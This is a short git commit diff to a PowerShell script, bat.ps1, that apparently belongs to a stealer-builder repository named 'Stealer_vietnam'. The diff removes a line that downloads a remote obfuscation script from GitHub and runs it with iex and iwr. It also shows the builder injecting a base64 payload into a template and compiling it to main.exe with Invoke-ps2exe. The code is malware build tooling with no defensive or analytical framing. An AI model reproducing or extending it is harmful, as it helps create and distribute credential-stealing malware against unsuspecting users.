75e23f3249a2168b2f2e3f09a081cef49d90af21
43a1723 <hai1723notgay@gmail.com>
2024-06-30 16:21:57 +0700

    Update bat.ps1

--- bat.ps1
+++ bat.ps1
@@ -149,10 +149,8 @@ $button.Add_Click({
 
         $pathexe = ".\main.exe"
         $scriptContent -replace "ENCODE64DROPHERE", $encodedFileContent | Set-Content -Path "$env:TEMP\main.ps1"
-        
-        iex (iwr -uri "https://raw.githubusercontent.com/s1uiasdad/Stealer_vietnam/main/file/drop/obf.ps1" -useb)
-        
-        Invoke-ps2exe "$putfile" "$pathexe"
+         
+        Invoke-ps2exe "$env:TEMP\main.ps1" "$pathexe"
 
         # Delete the .bat file after execution
         Remove-item "settings.json"
